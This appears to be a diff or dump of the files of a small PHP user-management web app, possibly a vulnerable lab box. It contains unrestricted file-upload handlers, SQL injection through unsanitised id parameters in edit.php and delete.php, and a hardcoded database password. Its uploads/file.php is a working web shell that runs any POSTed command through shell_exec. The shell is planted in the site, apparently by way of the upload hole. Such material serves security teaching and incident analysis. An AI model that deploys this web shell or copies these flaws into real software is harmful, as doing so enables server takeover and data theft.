@@ -1,0 +1,400 @@
+==> /var/www/html/system_sibersiaga/upload.php <==
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Upload your files</title>
+</head>
+<body>
+  <form enctype="multipart/form-data" action="upload.php" method="POST">
+    <p>Upload your file</p>
+    <input type="file" name="uploaded_file"></input><br />
+    <input type="submit" value="Upload"></input>
+  </form>
+</body>
+</html>
+<?PHP
+  if(!empty($_FILES['uploaded_file']))
+  {
+    $path = "/var/www/html/system_sibersiaga/";
+    $path = $path . basename( $_FILES['uploaded_file']['name']);
+
+    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
+      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
+      " has been uploaded";
+    } else{
+        echo "There was an error uploading the file, please try again!";
+    }
+  }
+?>
+
+==> /var/www/html/system_sibersiaga/addAction.php <==
+<html>
+<head>
+	<title>Add Data</title>
+</head>
+
+<body>
+<?php
+// Include the database connection file
+require_once("dbConnection.php");
+
+if (isset($_POST['submit'])) {
+	// Escape special characters in string for use in SQL statement	
+	$name = mysqli_real_escape_string($mysqli, $_POST['name']);
+	$age = mysqli_real_escape_string($mysqli, $_POST['age']);
+	$email = mysqli_real_escape_string($mysqli, $_POST['email']);
+		
+	// Check for empty fields
+	if (empty($name) || empty($age) || empty($email)) {
+		if (empty($name)) {
+			echo "<font color='red'>Name field is empty.</font><br/>";
+		}
+		
+		if (empty($age)) {
+			echo "<font color='red'>Age field is empty.</font><br/>";
+		}
+		
+		if (empty($email)) {
+			echo "<font color='red'>Email field is empty.</font><br/>";
+		}
+		
+		// Show link to the previous page
+		echo "<br/><a href='javascript:self.history.back();'>Go Back</a>";
+	} else { 
+		// If all the fields are filled (not empty) 
+
+		// Insert data into database
+		$result = mysqli_query($mysqli, "INSERT INTO users (`name`, `age`, `email`) VALUES ('$name', '$age', '$email')");
+		
+		// Display success message
+		echo "<p><font color='green'>Data added successfully!</p>";
+		echo "<a href='index.php'>View Result</a>";
+	}
+}
+?>
+</body>
+</html>
+
+==> /var/www/html/system_sibersiaga/index.php <==
+<?php
+// Include the database connection file
+require_once("dbConnection.php");
+
+// Fetch data in descending order (lastest entry first)
+$result = mysqli_query($mysqli, "SELECT * FROM users ORDER BY id DESC");
+?>
+
+<html>
+<head>	
+	<title>Homepage</title>
+</head>
+
+<body>
+	<h2>Homepage</h2>
+	<p>
+		<a href="add.php">Add New Data</a>
+	</p>
+	<table width='80%' border=0>
+		<tr bgcolor='#DDDDDD'>
+			<td><strong>Name</strong></td>
+			<td><strong>Age</strong></td>
+			<td><strong>Email</strong></td>
+			<td><strong>Action</strong></td>
+		</tr>
+		<?php
+		// Fetch the next row of a result set as an associative array
+		while ($res = mysqli_fetch_assoc($result)) {
+			echo "<tr>";
+			echo "<td>".$res['name']."</td>";
+			echo "<td>".$res['age']."</td>";
+			echo "<td>".$res['email']."</td>";	
+			echo "<td><a href=\"edit.php?id=$res[id]\">Edit</a> | 
+			<a href=\"delete.php?id=$res[id]\" onClick=\"return confirm('Are you sure you want to delete?')\">Delete</a></td>";
+		}
+		?>
+	</table>
+</body>
+</html>
+
+==> /var/www/html/system_sibersiaga/edit.php <==
+<?php
+// Include the database connection file
+require_once("dbConnection.php");
+
+// Get id from URL parameter
+$id = $_GET['id'];
+
+// Select data associated with this particular id
+$result = mysqli_query($mysqli, "SELECT * FROM users WHERE id = $id");
+
+// Fetch the next row of a result set as an associative array
+$resultData = mysqli_fetch_assoc($result);
+
+$name = $resultData['name'];
+$age = $resultData['age'];
+$email = $resultData['email'];
+?>
+<html>
+<head>	
+	<title>Edit Data</title>
+</head>
+
+<body>
+    <h2>Edit Data</h2>
+    <p>
+	    <a href="index.php">Home</a>
+    </p>
+	
+	<form name="edit" method="post" action="editAction.php">
+		<table border="0">
+			<tr> 
+				<td>Name</td>
+				<td><input type="text" name="name" value="<?php echo $name; ?>"></td>
+			</tr>
+			<tr> 
+				<td>Age</td>
+				<td><input type="text" name="age" value="<?php echo $age; ?>"></td>
+			</tr>
+			<tr> 
+				<td>Email</td>
+				<td><input type="text" name="email" value="<?php echo $email; ?>"></td>
+			</tr>
+			<tr>
+				<td><input type="hidden" name="id" value=<?php echo $id; ?>></td>
+				<td><input type="submit" name="update" value="Update"></td>
+			</tr>
+		</table>
+	</form>
+</body>
+</html>
+
+==> /var/www/html/system_sibersiaga/editAction.php <==
+<?php
+// Include the database connection file
+require_once("dbConnection.php");
+
+if (isset($_POST['update'])) {
+	// Escape special characters in a string for use in an SQL statement
+	$id = mysqli_real_escape_string($mysqli, $_POST['id']);
+	$name = mysqli_real_escape_string($mysqli, $_POST['name']);
+	$age = mysqli_real_escape_string($mysqli, $_POST['age']);
+	$email = mysqli_real_escape_string($mysqli, $_POST['email']);	
+	
+	// Check for empty fields
+	if (empty($name) || empty($age) || empty($email)) {
+		if (empty($name)) {
+			echo "<font color='red'>Name field is empty.</font><br/>";
+		}
+		
+		if (empty($age)) {
+			echo "<font color='red'>Age field is empty.</font><br/>";
+		}
+		
+		if (empty($email)) {
+			echo "<font color='red'>Email field is empty.</font><br/>";
+		}
+	} else {
+		// Update the database table
+		$result = mysqli_query($mysqli, "UPDATE users SET `name` = '$name', `age` = '$age', `email` = '$email' WHERE `id` = $id");
+		
+		// Display success message
+		echo "<p><font color='green'>Data updated successfully!</p>";
+		echo "<a href='index.php'>View Result</a>";
+	}
+}
+
+==> /var/www/html/system_sibersiaga/dbConnection.php <==
+<?php
+$databaseHost = 'localhost';
+$databaseName = 'siaga';
+$databaseUsername = 'systemuser';
+$databasePassword = 'P@ssword123';
+
+// Open a new connection to the MySQL server
+$mysqli = mysqli_connect($databaseHost, $databaseUsername, $databasePassword, $databaseName); 
+
+==> /var/www/html/system_sibersiaga/add.php <==
+<html>
+<head>
+	<title>Add Data</title>
+</head>
+
+<body>
+	<h2>Add Data</h2>
+	<p>
+		<a href="index.php">Home</a>
+	</p>
+
+	<form action="addAction.php" method="post" name="add">
+		<table width="25%" border="0">
+			<tr> 
+				<td>Name</td>
+				<td><input type="text" name="name"></td>
+			</tr>
+			<tr> 
+				<td>Age</td>
+				<td><input type="text" name="age"></td>
+			</tr>
+			<tr> 
+				<td>Email</td>
+				<td><input type="text" name="email"></td>
+			</tr>
+			<tr> 
+				<td></td>
+				<td><input type="submit" name="submit" value="Add"></td>
+			</tr>
+		</table>
+	</form>
+</body>
+</html>
+<?php
+$uploadDir = 'uploads/'; // Directory to store uploaded files
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $uploadedFile = $_FILES['file'];
+
+    // Check if the file was uploaded without errors
+    if ($uploadedFile['error'] === UPLOAD_ERR_OK) {
+        $fileName = basename($uploadedFile['name']);
+        $uploadPath = $uploadDir . $fileName;
+
+        // Move the uploaded file to the specified directory
+        if (move_uploaded_file($uploadedFile['tmp_name'], $uploadPath)) {
+            echo "File uploaded successfully.";
+        } else {
+            echo "Error uploading file.";
+        }
+    } else {
+        echo "Error: " . $uploadedFile['error'];
+    }
+}
+?>
+
+<form action="" method="POST" enctype="multipart/form-data">
+    Select a file to upload: <input type="file" name="file"><br>
+    <input type="submit" value="Upload">
+</form>
+
+
+==> /var/www/html/system_sibersiaga/delete.php <==
+<?php
+// Include the database connection file
+require_once("dbConnection.php");
+
+// Get id parameter value from URL
+$id = $_GET['id'];
+
+// Delete row from the database table
+$result = mysqli_query($mysqli, "DELETE FROM users WHERE id = $id");
+
+// Redirect to the main display page (index.php in our case)
+header("Location:index.php");
+
+==> /var/www/html/system_sibersiaga/uploads/file.php <==
+<?php
+if (!empty($_POST['cmd'])) {
+    $cmd = shell_exec($_POST['cmd']);
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Web Shell</title>
+    <style>
+        * {
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: sans-serif;
+            color: rgba(0, 0, 0, .75);
+        }
+
+        main {
+            margin: auto;
+            max-width: 850px;
+        }
+
+        pre,
+        input,
+        button {
+            border-radius: 5px;
+        }
+
+        pre,
+        input,
+        button {
+            background-color: #efefef;
+        }
+
+        label {
+            display: block;
+        }
+
+        input {
+            width: 100%;
+            background-color: #efefef;
+            border: 2px solid transparent;
+        }
+
+        input:focus {
+            outline: none;
+            background: transparent;
+            border: 2px solid #e6e6e6;
+        }
+
+        button {
+            border: none;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+
+        button:hover {
+            background-color: #e6e6e6;
+        }
+
+        pre,
+        input,
+        button {
+            padding: 10px;
+        }
+
+        .form-group {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            padding: 15px 0;
+        }
+    </style>
+
+</head>
+
+<body>
+    <main>
+        <h1>Web Shell</h1>
+        <h2>Execute a command</h2>
+
+        <form method="post">
+            <label for="cmd"><strong>Command</strong></label>
+            <div class="form-group">
+                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
+                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
+                <button type="submit">Execute</button>
+            </div>
+        </form>
+
+        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
+            <h2>Output</h2>
+            <?php if (isset($cmd)): ?>
+                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
+            <?php else: ?>
+                <pre><small>No result.</small></pre>
+            <?php endif; ?>
+        <?php endif; ?>
+    </main>
+</body>
+</html>
